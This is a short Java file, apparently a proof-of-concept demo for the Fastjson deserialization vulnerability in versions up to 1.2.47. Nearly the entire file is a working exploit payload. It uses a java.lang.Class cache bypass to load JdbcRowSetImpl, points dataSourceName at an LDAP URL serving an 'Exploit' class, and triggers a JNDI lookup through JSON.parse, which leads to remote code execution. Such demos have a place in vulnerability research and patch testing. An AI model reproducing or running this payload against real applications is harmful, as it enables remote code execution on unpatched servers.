package me.mole.fastjson.demo;

import com.alibaba.fastjson.JSON;

/**
 * 影响版本：<= 1.2.47
 */
public class Fastjson1247 {
    public static void main(String[] args){
        String payload =
                "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8384/Exploit\",\"autoCommit\":true}}";

        Object jsonObject = JSON.parse(payload);
    }
}
